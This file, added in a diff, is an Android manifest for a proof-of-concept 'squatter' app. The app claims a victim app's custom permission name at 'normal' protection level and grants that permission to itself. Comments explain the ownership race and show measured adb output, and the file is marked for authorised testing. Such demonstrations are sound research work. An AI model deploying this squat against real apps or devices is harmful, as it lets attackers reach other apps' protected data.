@@ -1,0 +1,83 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!--
+  examples/squat-pair/squatter-AndroidManifest.xml
+  ===============================================
+  THE ATTACKER.
+
+  This app contains no code. It exists to do exactly two things:
+
+    1. DECLARE a permission whose name belongs, by convention, to somebody
+       else. The convention reserves nothing. On a device where no package has
+       yet claimed "com.victim.notes.permission.READ_NOTES", installing this
+       app makes THIS package its owner, and the protectionLevel below is the
+       one the platform will enforce - against the victim's components.
+
+    2. REQUEST that same permission, so it holds what it just invented. An app
+       can declare and use a permission in one manifest; at `normal` level it
+       is granted at install with no prompt.
+
+  Build with ./build-squat-pair.sh, which signs this with a DIFFERENT key from
+  the victim so that the signature relationship is genuinely absent.
+
+  MEASURED on Android 13 / API 33 with exactly this file:
+
+    $ adb install -r squatter.apk
+    Success
+    $ adb shell dumpsys package permission com.victim.notes.permission.READ_NOTES
+      Permission [com.victim.notes.permission.READ_NOTES] (8b8d463):
+        sourcePackage=com.squat.first
+        uid=10139 gids=[] type=0 prot=normal
+
+  Note `gids=[]`. A custom permission can never map to a Linux group - only
+  /system/etc/permissions/*.xml can create that mapping and an app cannot write
+  there. No custom permission is ever kernel-enforced. See README.md 3.5.
+
+  AUTHORISED TESTING ONLY. Install this on a device you own.
+-->
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.squat.first">
+
+    <uses-sdk android:minSdkVersion="21" android:targetSdkVersion="33" />
+
+    <!--
+      The squat. Same NAME as the victim's permission, WEAKER level.
+
+      protectionLevel="normal" means: granted to any app that requests it, at
+      install, with no prompt and no check of any kind. If this definition wins
+      the ownership race, every component in every app that relies on this
+      permission name is guarded by a rule that grants itself.
+    -->
+    <permission
+        android:name="com.victim.notes.permission.READ_NOTES"
+        android:protectionLevel="normal"
+        android:label="Read notes"
+        android:description="@string/perm_desc" />
+
+    <!--
+      And take it. This is not required for the squat to work against a third
+      party - it is here so that a single `dumpsys package com.squat.first`
+      shows all three grant blocks agreeing on one string, which makes the
+      model concrete. See README.md 3.6.
+    -->
+    <uses-permission android:name="com.victim.notes.permission.READ_NOTES" />
+
+    <!--
+      Package visibility. From targetSdk 30 an app cannot see a package it has
+      not declared an interest in, and a probe that silently sees nothing looks
+      exactly like a probe that proved the target unreachable.
+    -->
+    <queries>
+        <package android:name="com.victim.notes" />
+        <package android:name="com.victim.suite" />
+    </queries>
+
+    <!--
+      android:hasCode="false" - there is no classes.dex in this APK at all.
+      A permission declaration needs no code, and removing the code removes
+      every distraction from what the manifest is doing.
+    -->
+    <application
+        android:hasCode="false"
+        android:label="SquatFirst" />
+
+</manifest>
